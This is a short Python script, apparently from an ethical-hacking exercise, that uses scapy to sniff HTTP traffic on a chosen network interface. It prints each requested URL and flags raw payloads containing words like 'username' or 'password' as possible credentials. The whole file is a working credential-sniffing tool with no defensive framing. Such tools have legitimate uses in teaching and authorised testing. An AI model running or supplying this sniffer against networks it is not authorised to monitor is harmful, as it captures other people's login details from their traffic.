#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to listen on")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Interface not specified. Use --help for more info.")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_processor)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def packet_processor(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_credentials(packet)
        if login_info:
            print("\n\n[+] Possible credentials > " + login_info + "\n\n")


input_options = get_arguments()
sniff(input_options.interface)
